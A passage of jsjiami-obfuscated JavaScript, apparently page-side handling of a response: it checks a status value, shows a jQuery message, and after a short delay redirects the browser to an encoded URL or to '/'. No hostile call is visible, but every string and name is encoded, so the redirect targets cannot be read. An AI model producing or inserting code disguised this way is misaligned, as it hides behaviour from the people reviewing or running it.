_0x1115ac[_0x2bca('49','[ICT')](_0x1995b3,_0x4886d6);},'YPQLD':_0x1115ac[_0x2bca('4a','3EZY')],'MlktM':_0x1115ac[_0x2bca('4b','wMwG')]};if(_0x1115ac[_0x2bca('4c',']pYv')](_0x1115ac[_0x2bca('4d','$S1O')],_0x1115ac[_0x2bca('4e','l4M$')])){_0x1115ac[_0x2bca('4f','gkbg')](0x1,_0x29bede[_0x2bca('50',')utN')])?(_0x1115ac[_0x2bca('51','vJh&')]($,_0x1115ac[_0x2bca('52','(XJ@')])[_0x2bca('53','6]0*')](_0x1115ac[_0x2bca('54','$S1O')]),_0x1115ac[_0x2bca('55','Tzv(')](setTimeout,function(){if(_0x5bcef4[_0x2bca('56','[ICT')](_0x5bcef4[_0x2bca('57','0Fed')],_0x5bcef4[_0x2bca('58','m3G)')])){var _0x50a2bb={'nfSaw':_0x431fc5[_0x2bca('59','466*')]};_0x431fc5[_0x2bca('5a','@YTX')](0x1,_0x29bede[_0x2bca('5b','wMwG')])?(_0x431fc5[_0x2bca('5c','3EZY')]($,_0x431fc5[_0x2bca('5d','6]0*')])[_0x2bca('5e','@YTX')](_0x431fc5[_0x2bca('5f','m3G)')]),_0x431fc5[_0x2bca('60','VujP')](setTimeout,function(){location[_0x2bca('61','@YTX')]=_0x50a2bb[_0x2bca('62','bb]S')];},0x1f4)):(_0x431fc5[_0x2bca('63','gkbg')]($,_0x431fc5[_0x2bca('64','MhtE')])[_0x2bca('53','6]0*')](_0x431fc5[_0x2bca('65','vJh&')]),_0x431fc5[_0x2bca('66','P)kS')](setTimeout,function(){location[_0x2bca('67','MDic')]='/';},0x1f4));}else{location[_0x2bca('68','Qza%')]=_0x5bcef4[_0x2bca('69','#]fj')];}},0x1f4)):(_0x1115ac[_0x2bca('6a','bb]S')]($,_0x1115ac[_0x2bca('6b','gkbg')])[_0x2bca('6c','mP!]')](_0x1115ac[_0x2bca('6d','s6m0')]),_0x1115ac[_0x2bca('6e','IuRm')](setTimeout,function(){location[_0x2bca('6f','(XJ@')]='/';},0x1f4));}else{location[_0x2bca('70','DTRZ')]=_0x431fc5[_0x2bca('71','l4M$')];}}});});});;_0xodP='jsjiami.com.v6';